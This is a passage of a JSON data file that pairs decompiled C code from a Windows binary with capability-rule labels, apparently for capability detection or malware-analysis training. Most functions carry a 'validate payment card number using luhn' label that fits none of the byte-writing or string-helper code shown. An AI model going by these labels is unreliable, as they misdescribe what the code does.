0xf9;\n    *0x445ba0 = 8;\n    *0x445ba1 = 0xaf;\n    *0x4467c3 = 0x9b;\n    *0x4467c4 = 0xa3;\n    *0x4467c5 = 0xea;\n    *0x4467c6 = 0xe3;\n    *0x4467c7 = 0x98;\n    *0x4467c8 = 0xed;\n    *0x4467c9 = 0x16;\n    *0x4467ca = 0xcd;\n    *0x4467cb = 0xfc;\n    *0x4467cc = 0xfc;\n    *0x4467cd = 0x9d;\n    *0x4467ce = 0x8f;\n    *0x4467cf = 0xdf;\n    *0x4467d0 = 0xae;\n    *0x4467d1 = 0x4a;\n    *0x4467d2 = 0x48;\n    *0x4467d3 = 0x5e;\n    *0x4467d4 = 5;\n    *0x4467d5 = 0x2a;\n    *0x4467d6 = 0x7c;\n    *0x4467d7 = 0x1a;\n    *0x4467d8 = 0xa7;\n    *0x4467d9 = 0x11;\n    *0x4467da = 0x93;\n    *0x4467db = 0xb7;\n    *0x4467dc = 0x5c;\n    *0x4467dd = 0x15;\n    *0x4467de = 0x59;\n    *0x4467df = 0x5f;\n    *0x4467e0 = 0x94;\n    *0x4467e1 = 0x10;\n    *0x4467e2 = 0x7d;\n    *0x4467e3 = 0x3c;\n    *0x4467e4 = 0xdf;\n    *0x4467e5 = 0x22;\n    *0x4467e6 = 0x12;\n    *0x4467e7 = 2;\n    *0x4467e8 = 0x73;\n    *0x4467e9 = 0x2e;\n    *0x4467ea = 0x11;\n    *0x4467eb = 0x62;\n    *0x4467ec = 0xa9;\n    *0x4467ed = 0x58;\n    *0x4467ee = 0xd5;\n    *0x4467ef = 0x98;\n    *0x4467f0 = 0x80;\n    *0x4467f1 = 0x8e;\n    return param_1 + iVar1 + 0x164138;\n}\n",
        "token_count": 1328
    },
    "0040e140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040e140(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040dea0(param_1);\n    *0x445bd1 = 0x2d;\n    *0x445bd2 = 0xd4;\n    *0x445bd3 = 0x68;\n    *0x445bd4 = 0xb5;\n    *0x445bd5 = 0x96;\n    *0x445bd6 = 0xb2;\n    *0x445bd7 = 0xe4;\n    *0x445bd8 = 6;\n    *0x445bd9 = 0xfa;\n    *0x445bda = 0x2c;\n    *0x445bdb = 0xdb;\n    *0x445bdc = 0xe9;\n    *0x445bdd = 0xc;\n    *0x445bde = 0x8c;\n    *0x445bdf = 0xf8;\n    *0x445be0 = 0x75;\n    *0x445be1 = 0x93;\n    *0x445be2 = 0xd4;\n    *0x445be3 = 0x3e;\n    *0x445be4 = 0xb3;\n    *0x445be5 = 0xeb;\n    *0x445be6 = 0x37;\n    *0x445be7 = 0x81;\n    *0x445be8 = 0x22;\n    *0x445be9 = 0x82;\n    *0x445bea = 0x9d;\n    *0x445beb = 0xeb;\n    *0x445bec = 0x35;\n    *0x445bed = 0x5b;\n    *0x445bee = 0x23;\n    *0x445bef = 0x78;\n    *0x445bf0 = 0xd0;\n    *0x445bf1 = 0x8e;\n    *0x445bf2 = 0x98;\n    *0x445bf3 = 0x7a;\n    *0x445bf4 = 0xce;\n    *0x445bf5 = 199;\n    *0x445bf6 = 1;\n    *0x445bf7 = 0x16;\n    *0x445bf8 = 0x7e;\n    *0x445bf9 = 0xc3;\n    *0x445bfa = 0x16;\n    *0x445bfb = 0xc5;\n    *0x445bfc = 0x22;\n    *0x445bfd = 0xd6;\n    *0x445bfe = 0xc4;\n    *0x445bff = 0xd5;\n    *0x446821 = 0xdd;\n    *0x446822 = 0x90;\n    *0x446823 = 0xe9;\n    *0x446824 = 0x16;\n    *0x446825 = 0x5a;\n    *0x446826 = 0x6d;\n    *0x446827 = 0xb7;\n    *0x446828 = 0x77;\n    *0x446829 = 0x1b;\n    *0x44682a = 0x4e;\n    *0x44682b = 0x8a;\n    *0x44682c = 0x35;\n    *0x44682d = 0x85;\n    *0x44682e = 0xce;\n    *0x44682f = 0xdc;\n    *0x446830 = 0x8d;\n    *0x446831 = 0xc4;\n    *0x446832 = 0x6c;\n    *0x446833 = 0x29;\n    *0x446834 = 0xe0;\n    *0x446835 = 0x46;\n    *0x446836 = 0xc;\n    *0x446837 = 0x72;\n    *0x446838 = 0x35;\n    *0x446839 = 0x3d;\n    *0x44683a = 0x77;\n    *0x44683b = 0xbb;\n    *0x44683c = 0xb6;\n    *0x44683d = 0x20;\n    *0x44683e = 0xd7;\n    *0x44683f = 0x8d;\n    *0x446840 = 0x2f;\n    *0x446841 = 0x2a;\n    *0x446842 = 0x3b;\n    *0x446843 = 0x75;\n    *0x446844 = 0x92;\n    *0x446845 = 0xda;\n    *0x446846 = 0x19;\n    *0x446847 = 0x83;\n    *0x446848 = 0x76;\n    *0x446849 = 0x71;\n    *0x44684a = 199;\n    *0x44684b = 0xcc;\n    *0x44684c = 0x93;\n    *0x44684d = 0x77;\n    *0x44684e = 0;\n    *0x44684f = 0xe8;\n    return param_1 + iVar1 + 0x15be11;\n}\n",
        "token_count": 1241
    },
    "0040e690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040e690(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040e3e0(param_1);\n    *0x445c2f = 0xe7;\n    *0x445c30 = 0x2f;\n    *0x445c31 = 0xf7;\n    *0x445c32 = 0xf5;\n    *0x445c33 = 0xf;\n    *0x445c34 = 1;\n    *0x445c35 = 0x26;\n    *0x445c36 = 0x8b;\n    *0x445c37 = 0xc3;\n    *0x445c38 = 8;\n    *0x445c39 = 0xab;\n    *0x445c3a = 0xf0;\n    *0x445c3b = 0xbc;\n    *0x445c3c = 0xc3;\n    *0x445c3d = 0x19;\n    *0x445c3e = 0x4e;\n    *0x445c3f = 0x87;\n    *0x445c40 = 0x2b;\n    *0x445c41 = 0x17;\n    *0x445c42 = 0x87;\n    *0x445c43 = 6;\n    *0x445c44 = 0x27;\n    *0x445c45 = 0xe1;\n    *0x445c46 = 0xad;\n    *0x445c47 = 0xec;\n    *0x445c48 = 0x18;\n    *0x445c49 = 0xc5;\n    *0x445c4a = 0x8b;\n    *0x445c4b = 0x45;\n    *0x445c4c = 0x4f;\n    *0x445c4d = 0xa7;\n    *0x445c4e = 0x1a;\n    *0x445c4f = 0xec;\n    *0x445c50 = 0x92;\n    *0x445c51 = 0x7d;\n    *0x445c52 = 0xd;\n    *0x445c53 = 0x13;\n    *0x445c54 = 0x9b;\n    *0x445c55 = 0xd4;\n    *0x445c56 = 0x46;\n    *0x445c57 = 0xbf;\n    *0x445c58 = 0x98;\n    *0x445c59 = 0x49;\n    *0x445c5a = 0x5e;\n    *0x445c5b = 0x48;\n    *0x445c5c = 0xac;\n    *0x445c5d = 0x11;\n    *0x44687f = 0x81;\n    *0x446880 = 0x65;\n    *0x446881 = 0xd4;\n    *0x446882 = 0x18;\n    *0x446883 = 0x37;\n    *0x446884 = 0x8b;\n    *0x446885 = 0xdf;\n    *0x446886 = 0xad;\n    *0x446887 = 0x3e;\n    *0x446888 = 0xac;\n    *0x446889 = 0x1c;\n    *0x44688a = 0xad;\n    *0x44688b = 0xe9;\n    *0x44688c = 0xc0;\n    *0x44688d = 0x52;\n    *0x44688e = 0x13;\n    *0x44688f = 0x12;\n    *0x446890 = 0x66;\n    *0x446891 = 0xb;\n    *0x446892 = 0xbe;\n    *0x446893 = 0x95;\n    *0x446894 = 0x5e;\n    *0x446895 = 0x16;\n    *0x446896 = 0xf3;\n    *0x446897 = 0xd3;\n    *0x446898 = 0xf;\n    *0x446899 = 5;\n    *0x44689a = 0xd8;\n    *0x44689b = 0x30;\n    *0x44689c = 2;\n    *0x44689d = 0xb0;\n    *0x44689e = 0xfa;\n    *0x44689f = 0x94;\n    *0x4468a0 = 100;\n    *0x4468a1 = 0xb0;\n    *0x4468a2 = 200;\n    *0x4468a3 = 0xee;\n    *0x4468a4 = 0x88;\n    *0x4468a5 = 0xe5;\n    *0x4468a6 = 0x16;\n    *0x4468a7 = 0xad;\n    *0x4468a8 = 99;\n    *0x4468a9 = 0xf1;\n    *0x4468aa = 0x9b;\n    *0x4468ab = 0x45;\n    *0x4468ac = 0xf;\n    *0x4468ad = 0xba;\n    return param_1 + iVar1 + 0x167dfa;\n}\n",
        "token_count": 1267
    },
    "0040ebe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040ebe0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040e940(param_1);\n    *0x445c8d = 0x46;\n    *0x445c8e = 0xe3;\n    *0x445c8f = 0xcf;\n    *0x445c90 = 0;\n    *0x445c91 = 0x71;\n    *0x445c92 = 0x51;\n    *0x445c93 = 0xcb;\n    *0x445c94 = 0xd;\n    *0x445c95 = 0x6e;\n    *0x445c96 = 0xe7;\n    *0x445c97 = 0x3f;\n    *0x445c98 = 0x91;\n    *0x445c99 = 0x1d;\n    *0x445c9a = 0x7f;\n    *0x445c9b = 0xc3;\n    *0x445c9c = 0xed;\n    *0x445c9d = 0xef;\n    *0x445c9e = 0x23;\n    *0x445c9f = 0xc4;\n    *0x445ca0 = 0xf8;\n    *0x445ca1 = 0x6c;\n    *0x445ca2 = 0x95;\n    *0x445ca3 = 3;\n    *0x445ca4 = 0x7b;\n    *0x445ca5 = 0xb0;\n    *0x445ca6 = 200;\n    *0x445ca7 = 0x15;\n    *0x445ca8 = 0xb5;\n    *0x445ca9 = 0xea;\n    *0x445caa = 100;\n    *0x445cab = 0xe4;\n    *0x445cac = 0xd9;\n    *0x445cad = 0xdc;\n    *0x445cae = 0x46;\n    *0x445caf = 0x2d;\n    *0x445cb0 = 0x8b;\n    *0x445cb1 = 0x5e;\n    *0x445cb2 = 0xfd;\n    *0x445cb3 = 1;\n    *0x445cb4 = 0x66;\n    *0x445cb5 = 0xda;\n    *0x445cb6 = 0x4e;\n    *0x445cb7 = 0x44;\n    *0x445cb8 = 0x79;\n    *0x445cb9 = 0xd1;\n    *0x445cba = 0xb1;\n    *0x445cbb = 0x31;\n    *0x4468dd = 0x76;\n    *0x4468de = 0x52;\n    *0x4468df = 0x2e;\n    *0x4468e0 = 0x6c;\n    *0x4468e1 = 0xb8;\n    *0x4468e2 = 0xee;\n    *0x4468e3 = 0x46;\n    *0x4468e4 = 0xc3;\n    *0x4468e5 = 0x38;\n    *0x4468e6 = 100;\n    *0x4468e7 = 0xed;\n    *0x4468e8 = 0x4b;\n    *0x4468e9 = 0xd9;\n    *0x4468ea = 0xab;\n    *0x4468eb = 0xd8;\n    *0x4468ec = 0x5e;\n    *0x4468ed = 0xc2;\n    *0x4468ee = 0x1e;\n    *0x4468ef = 0x40;\n    *0x4468f0 = 0xf9;\n    *0x4468f1 = 0xde;\n    *0x4468f2 = 0xff;\n    *0x4468f3 = 0x61;\n    *0x4468f4 = 0x3e;\n    *0x4468f5 = 0x5a;\n    *0x4468f6 = 0xf0;\n    *0x4468f7 = 0xfb;\n    *0x4468f8 = 0xf2;\n    *0x4468f9 = 0x2a;\n    *0x4468fa = 0x78;\n    *0x4468fb = 0xd4;\n    *0x4468fc = 0;\n    *0x4468fd = 0x84;\n    *0x4468fe = 0x84;\n    *0x4468ff = 0x34;\n    *0x446900 = 0xf4;\n    *0x446901 = 99;\n    *0x446902 = 0xe3;\n    *0x446903 = 0x67;\n    *0x446904 = 0x81;\n    *0x446905 = 5;\n    *0x446906 = 0xc9;\n    *0x446907 = 0x3f;\n    *0x446908 = 0xfb;\n    *0x446909 = 0x6d;\n    *0x44690a = 0x4d;\n    *0x44690b = 0x8f;\n    return param_1 + iVar1 + 0x158988;\n}\n",
        "token_count": 1281
    },
    "0040f140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040f140(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ee90(param_1);\n    *0x445ceb = 0xe7;\n    *0x445cec = 0xe4;\n    *0x445ced = 0xd6;\n    *0x445cee = 0x46;\n    *0x445cef = 3;\n    *0x445cf0 = 0x89;\n    *0x445cf1 = 0x5d;\n    *0x445cf2 = 0xa8;\n    *0x445cf3 = 0x5d;\n    *0x445cf4 = 0x98;\n    *0x445cf5 = 0x30;\n    *0x445cf6 = 0x87;\n    *0x445cf7 = 0x18;\n    *0x445cf8 = 0x62;\n    *0x445cf9 = 0x10;\n    *0x445cfa = 0x99;\n    *0x445cfb = 0xaf;\n    *0x445cfc = 0x26;\n    *0x445cfd = 0x4e;\n    *0x445cfe = 0xcc;\n    *0x445cff = 0x6d;\n    *0x445d00 = 0x9c;\n    *0x445d01 = 0x53;\n    *0x445d02 = 0xbe;\n    *0x445d03 = 0xf5;\n    *0x445d04 = 0x6e;\n    *0x445d05 = 0x19;\n    *0x445d06 = 0x45;\n    *0x445d07 = 0xbb;\n    *0x445d08 = 0xba;\n    *0x445d09 = 0xb0;\n    *0x445d0a = 0xe8;\n    *0x445d0b = 0x89;\n    *0x445d0c = 0x92;\n    *0x445d0d = 0xba;\n    *0x445d0e = 100;\n    *0x445d0f = 0xfc;\n    *0x445d10 = 0x7b;\n    *0x445d11 = 0xef;\n    *0x445d12 = 0x28;\n    *0x445d13 = 4;\n    *0x445d14 = 0xf1;\n    *0x445d15 = 0x9a;\n    *0x445d16 = 0xd9;\n    *0x445d17 = 0x67;\n    *0x445d18 = 0xe2;\n    *0x445d19 = 0x1a;\n    *0x44693b = 0xce;\n    *0x44693c = 0xef;\n    *0x44693d = 0x37;\n    *0x44693e = 0x35;\n    *0x44693f = 0xf3;\n    *0x446940 = 0x4d;\n    *0x446941 = 0x47;\n    *0x446942 = 0xd2;\n    *0x446943 = 0xd4;\n    *0x446944 = 0x7d;\n    *0x446945 = 0x25;\n    *0x446946 = 0x50;\n    *0x446947 = 0x85;\n    *0x446948 = 0x14;\n    *0x446949 = 0x13;\n    *0x44694a = 6;\n    *0x44694b = 0x18;\n    *0x44694c = 0xce;\n    *0x44694d = 0x97;\n    *0x44694e = 0xb0;\n    *0x44694f = 0x26;\n    *0x446950 = 6;\n    *0x446951 = 0xfd;\n    *0x446952 = 0xee;\n    *0x446953 = 0x4d;\n    *0x446954 = 0x40;\n    *0x446955 = 0xd3;\n    *0x446956 = 0xc3;\n    *0x446957 = 0xac;\n    *0x446958 = 0xa0;\n    *0x446959 = 0x6b;\n    *0x44695a = 0x16;\n    *0x44695b = 0x69;\n    *0x44695c = 0x70;\n    *0x44695d = 0x5c;\n    *0x44695e = 0x34;\n    *0x44695f = 0x2b;\n    *0x446960 = 0x9e;\n    *0x446961 = 1;\n    *0x446962 = 0x4c;\n    *0x446963 = 0xa1;\n    *0x446964 = 0x3b;\n    *0x446965 = 0xf9;\n    *0x446966 = 0xf2;\n    *0x446967 = 0xf9;\n    *0x446968 = 0xfd;\n    *0x446969 = 0xa5;\n    return param_1 + iVar1 + 0x157a49;\n}\n",
        "token_count": 1242
    },
    "0040f3e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040f3e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f140(param_1);\n    *0x445d1a = 0xcf;\n    *0x445d1b = 0x3e;\n    *0x445d1c = 0x2e;\n    *0x445d1d = 0x62;\n    *0x445d1e = 0x96;\n    *0x445d1f = 0x77;\n    *0x445d20 = 0x2e;\n    *0x445d21 = 0x79;\n    *0x445d22 = 0x6e;\n    *0x445d23 = 0x52;\n    *0x445d24 = 0x2a;\n    *0x445d25 = 0xfb;\n    *0x445d26 = 0xcc;\n    *0x445d27 = 0xe4;\n    *0x445d28 = 0xe1;\n    *0x445d29 = 0x96;\n    *0x445d2a = 0xd7;\n    *0x445d2b = 0x97;\n    *0x445d2c = 4;\n    *0x445d2d = 0x8d;\n    *0x445d2e = 0xeb;\n    *0x445d2f = 0xa7;\n    *0x445d30 = 0xbb;\n    *0x445d31 = 0x39;\n    *0x445d32 = 0x19;\n    *0x445d33 = 0xa6;\n    *0x445d34 = 0x1f;\n    *0x445d35 = 0x83;\n    *0x445d36 = 0xa5;\n    *0x445d37 = 0xf9;\n    *0x445d38 = 0xbf;\n    *0x445d39 = 0x6b;\n    *0x445d3a = 0x86;\n    *0x445d3b = 0x59;\n    *0x445d3c = 0x1c;\n    *0x445d3d = 0x85;\n    *0x445d3e = 0xea;\n    *0x445d3f = 0x54;\n    *0x445d40 = 0x2c;\n    *0x445d41 = 0x76;\n    *0x445d42 = 0xb0;\n    *0x445d43 = 0xc9;\n    *0x445d44 = 0xda;\n    *0x445d45 = 0x7b;\n    *0x445d46 = 0xec;\n    *0x445d47 = 0x70;\n    *0x445d48 = 0x84;\n    *0x44696a = 0x9d;\n    *0x44696b = 0x69;\n    *0x44696c = 0xbe;\n    *0x44696d = 0xad;\n    *0x44696e = 0x29;\n    *0x44696f = 0xaa;\n    *0x446970 = 0xfb;\n    *0x446971 = 0x7c;\n    *0x446972 = 0x56;\n    *0x446973 = 0x78;\n    *0x446974 = 0x56;\n    *0x446975 = 0xbf;\n    *0x446976 = 0x47;\n    *0x446977 = 0x13;\n    *0x446978 = 0x15;\n    *0x446979 = 0xea;\n    *0x44697a = 3;\n    *0x44697b = 0xc1;\n    *0x44697c = 0xa0;\n    *0x44697d = 0xb3;\n    *0x44697e = 0xf8;\n    *0x44697f = 0x4a;\n    *0x446980 = 7;\n    *0x446981 = 0x95;\n    *0x446982 = 0x73;\n    *0x446983 = 0x7b;\n    *0x446984 = 0x7a;\n    *0x446985 = 0x4e;\n    *0x446986 = 0x28;\n    *0x446987 = 0xa4;\n    *0x446988 = 0xce;\n    *0x446989 = 0x62;\n    *0x44698a = 0xb1;\n    *0x44698b = 0x19;\n    *0x44698c = 0xff;\n    *0x44698d = 0x96;\n    *0x44698e = 7;\n    *0x44698f = 0xb4;\n    *0x446990 = 0xa8;\n    *0x446991 = 0x75;\n    *0x446992 = 10;\n    *0x446993 = 0x51;\n    *0x446994 = 0x8d;\n    *0x446995 = 0xce;\n    *0x446996 = 0xff;\n    *0x446997 = 0x51;\n    *0x446998 = 0x12;\n    return param_1 + iVar1 + 0x168dc8;\n}\n",
        "token_count": 1261
    },
    "00410570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00410570(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x74) + param_2 * 0x10;\n    *(iVar1 + 0xc) = *(iVar1 + 0xc) == '\\0';\n    (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0xfc), 0x1015, param_2, param_2);\n    return;\n}\n",
        "token_count": 119
    },
    "004106f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004106f0(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_2 == 0) {\n        fcn.004010f0(0x80070057);\n    }\n    iVar2 = fcn.0041bfe1(param_2, param_2);\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n        fcn.00401350(iVar2);\n    }\n    fcn.0041bf8a(*param_1, param_2, param_2);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return;\n    }\n    fcn.004010f0(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 249
    },
    "00410860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00410860(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x435908;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iVar1 = fcn.004013a0(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    uStack4 = 0;\n    iVar1 = fcn.004013a0(param_2[1] + -0x10);\n    param_1[1] = iVar1 + 0x10;\n    param_1[2] = param_2[2];\n    *(param_1 + 3) = *(param_2 + 3);\n    *in_FS_OFFSET = uStack12;\n    return param_1;\n}\n",
        "token_count": 236
    },
    "004109e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.004109e0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h, uint noname_9, uint arg_10h)\n\n{\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch;\n    int32_t var_10h;\n    uint var_14h;\n    uint var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x435931;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    var_4h._1_3_ = 0;\n    for (; var_8h != var_ch; var_8h = var_8h + 0x10) {\n        var_4h._0_1_ = 1;\n        if (var_10h != 0) {\n            fcn.00410860(var_8h);\n        }\n        var_10h = var_10h + 0x10;\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return var_10h;\n}\n",
        "token_count": 304
    },
    "00410aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00410aa0(code **param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4359f8;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    fcn.0041c04b();\n    *param_1 = vtable.std::logic_error.0;\n    param_1[8] = NULL;\n    param_1[9] = 0xf;\n    uStack4 = 0;\n    *(param_1 + 4) = 0;\n    fcn.00410770(param_2, 0);\n    *in_FS_OFFSET = 0xffffffff;\n    return param_1;\n}\n",
        "token_count": 193
    },
    "00410b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410b20(code **param_1)\n\n{\n    *param_1 = vtable.std::logic_error.0;\n    if (0xf < param_1[9]) {\n        fcn.00428fdc(param_1[4]);\n    }\n    param_1[9] = 0xf;\n    param_1[8] = NULL;\n    *(param_1 + 4) = 0;\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0041ba6d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "00410b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00410b60(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uStack20;\n    int32_t *piStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x435963;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    piStack16 = param_1;\n    piVar1 = fcn.00428235();\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    uStack4 = 0;\n    piVar1 = fcn.00428235();\n    iVar2 = (**(*piVar1 + 0xc))();\n    param_1[1] = iVar2 + 0x10;\n    uStack4._0_1_ = 1;\n    uVar3 = fcn.004038b0(&uStack20);\n    uStack4 = CONCAT31(uStack4._1_3_, 2);\n    fcn.004019f0(uVar3);\n    uStack8._0_1_ = 1;\n    piVar1 = unaff_ESI + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(unaff_ESI + -0x10) + 4))(unaff_ESI + -0x10);\n    }\n    uVar3 = fcn.004039a0(&stack0xffffffe8);\n    uStack8 = CONCAT31(uStack8._1_3_, 3);\n    fcn.004019f0(uVar3);\n    uStack12 = CONCAT31(uStack12._1_3_, 1);\n    piVar1 = unaff_EDI + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**(unaff_EDI + -0x10) + 4))(unaff_EDI + -0x10);\n    }\n    uVar4 = fcn.0041aefd();\n    uVar4 = uVar4 & 0x80000003;\n    if (uVar4 < 0) {\n        uVar4 = (uVar4 - 1 | 0xfffffffc) + 1;\n    }\n    param_1[2] = uVar4;\n    uVar4 = fcn.0041aefd();\n    uVar4 = uVar4 & 0x80000001;\n    bVar5 = uVar4 == 0;\n    if (uVar4 < 0) {\n        bVar5 = (uVar4 - 1 | 0xfffffffe) == 0xffffffff;\n    }\n    *(param_1 + 3) = !bVar5;\n    *in_FS_OFFSET = uStack20;\n    return param_1;\n}\n",
        "token_count": 771
    },
    "00410c70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410c70(int32_t param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t iStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x435978;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack12;\n    iStack16 = param_1;\n    piVar2 = fcn.00428235();\n    iStack16 = (**(*piVar2 + 0xc))();\n    iStack16 = iStack16 + 0x10;\n    iVar3 = 0;\n    uStack4 = 0;\n    if (*(param_1 + 0x74) != 0) {\n        iVar3 = *(param_1 + 0x78) - *(param_1 + 0x74) >> 4;\n    }\n    fcn.004109c0(&iStack16, \"%d items.\", iVar3);\n    iVar3 = iStack16;\n    fcn.0042cda5(0x3eb, iStack16);\n    fcn.0042cea8();\n    ppiVar1 = iVar3 + -0x10;\n    uStack12 = 0xffffffff;\n    piVar2 = iVar3 + -4;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar1 + 4))(ppiVar1);\n    }\n    *in_FS_OFFSET = unaff_ESI;\n    return;\n}\n",
        "token_count": 406
    },
    "00410eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00410eb0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h, uint arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4359c1;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h._1_3_ = 0;\n    for (; var_ch_2 != 0; var_ch_2 = var_ch_2 + -1) {\n        var_4h._0_1_ = 1;\n        if (var_8h != 0) {\n            fcn.00410860(var_10h);\n        }\n        var_8h = var_8h + 0x10;\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 282
    },
    "00411170": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411170(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    if (param_1 != param_2) {\n        do {\n            fcn.004019f0(param_3);\n            fcn.004019f0();\n            *(param_1 + 8) = *(param_3 + 8);\n            *(param_1 + 0xc) = *(param_3 + 0xc);\n            param_1 = param_1 + 0x10;\n        } while (param_1 != param_2);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00411270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
